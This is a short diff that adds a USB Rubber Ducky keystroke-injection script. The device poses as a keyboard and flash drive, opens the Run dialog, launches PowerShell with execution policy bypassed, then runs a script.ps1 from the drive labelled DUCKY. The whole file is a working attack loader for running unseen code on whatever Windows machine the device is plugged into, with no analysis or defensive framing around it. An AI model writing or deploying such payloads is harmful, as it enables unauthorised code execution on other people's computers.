@@ -1,0 +1,16 @@
+REM The USB Rubber Ducky will function as a "flash drive" and as a "keyboard"
+ATTACKMODE HID STORAGE
+DELAY 1000
+
+REM Open execute window with Windows+R
+GUI r
+DELAY 1000
+
+REM Open powershell window
+STRING powershell -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+
+REM Execute script in powershell
+STRING $uP = Get-WMIObject Win32_Volume | ?{ $_.Label -eq 'DUCKY' } | select name; cd $uP.name; .\script.ps1
+ENTER
